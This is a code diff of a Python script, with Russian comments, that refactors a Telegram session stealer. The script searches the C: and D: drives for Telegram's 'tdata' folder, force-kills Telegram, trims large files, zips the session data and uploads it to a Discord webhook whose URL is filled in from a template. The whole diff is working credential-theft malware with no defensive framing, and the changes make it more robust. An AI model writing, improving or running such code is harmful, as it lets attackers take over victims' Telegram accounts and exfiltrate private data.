@@ -1,59 +1,81 @@
 import os
 import time
-from discord_webhook import DiscordWebhook, DiscordEmbed
-from zipfile import ZipFile, ZIP_DEFLATED
 import zipfile
 import shutil
+from discord_webhook import DiscordWebhook
 
-#search folder
-folder_name = 'tdata'
+# ======= Настройки =======
+FOLDER_NAME = 'tdata'
+SEARCH_PATHS = ['D:\\', 'C:\\']
+WEBHOOK_URL = {{"HOOK"}}
 
-search_pathD = 'D:\\'
-search_pathC = 'C:\\'
+# ======= Поиск папки tdata =======
+full_path = None
+for path in SEARCH_PATHS:
+    for root, dirs, _ in os.walk(path):
+        if FOLDER_NAME in dirs:
+            full_path = os.path.join(root, FOLDER_NAME)
+            break
+    if full_path:
+        break 
 
-found = False
-for root, dirs, files in os.walk(search_pathD):
-    if folder_name in dirs:
-        found = True
-        full_path = os.path.join(root, folder_name)
-
-for root, dirs, files in os.walk(search_pathC):
-    if folder_name in dirs:
-        found = True
-        full_path = os.path.join(root, folder_name)
-
-home = os.path.expanduser('~')
-user = os.path.join(full_path) 
-hook = "{{HOOK}}"
-#search folder end
+# ======= Функции =======
 
 def task_kill():
     os.system('taskkill /f /im Telegram.exe')
+    time.sleep(0.3)
 
 def delete_fold():
-    folder_path1 = os.path.join(user, 'user_data')
-    folder_path2 = os.path.join(user, 'emoji')
-    time.sleep(2)
-    if os.path.isdir(folder_path1) == True:
-        shutil.rmtree(folder_path1)
-        shutil.rmtree(folder_path2)
+    folders_to_remove = ['user_data', 'emoji']
 
-def archivation():
-    with zipfile.ZipFile("tdata.zip", 'w', ZIP_DEFLATED, compresslevel=9) as archive:
-        for root, dirs, files in os.walk(user):
+    for folder in folders_to_remove:
+        folder_path = os.path.join(full_path, folder)
+        if os.path.isdir(folder_path):
+            shutil.rmtree(folder_path)
+
+    folder2_name = os.path.join(full_path, 'D877F783D5D3EF8C')
+    for filename in os.listdir(folder2_name):
+        file_path = os.path.join(folder2_name, filename)
+        
+        if os.path.isfile(file_path):
+            file_size = os.path.getsize(file_path)
+            
+            if file_size > 3 * 1024 * 1024:
+                os.remove(file_path)
+        
+def archive_tdata():
+    archive_name = "tdata.zip"
+    if os.path.exists(archive_name):
+        os.remove(archive_name)  # Удаляем старый архив, если он есть
+
+    with zipfile.ZipFile(archive_name, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as archive:
+        for root, _, files in os.walk(full_path):
             for file in files:
                 file_path = os.path.join(root, file)
-                archive.write(file_path, os.path.relpath(file_path, os.path.join(user, '..')))
+                archive.write(file_path, os.path.relpath(file_path, os.path.join(full_path, '..')))
 
-def discord_send():
-    webhook = DiscordWebhook(url=hook)
-    with open("tdata.zip", 'rb') as f:
+
+def send_to_discord():
+    archive_name = "tdata.zip"
+    if not os.path.exists(archive_name):
+        return
+
+    webhook = DiscordWebhook(url=WEBHOOK_URL)
+    with open(archive_name, 'rb') as f:
         webhook.add_file(file=f.read(), filename='tdata_session.zip')
-    webhook.execute()
 
+    response = webhook.execute()
+    if response.status_code == 200 or response.status_code == 204:
+        return 0
+    else:
+        print(f"Ошибка отправки файла. Код ответа: {response.status_code}")
+
+# ======= Основной запуск =======
 def main():
     task_kill()
     delete_fold()
-    archivation()
-    discord_send()
-main()
+    archive_tdata()
+    send_to_discord()
+
+if __name__ == "__main__":
+    main()
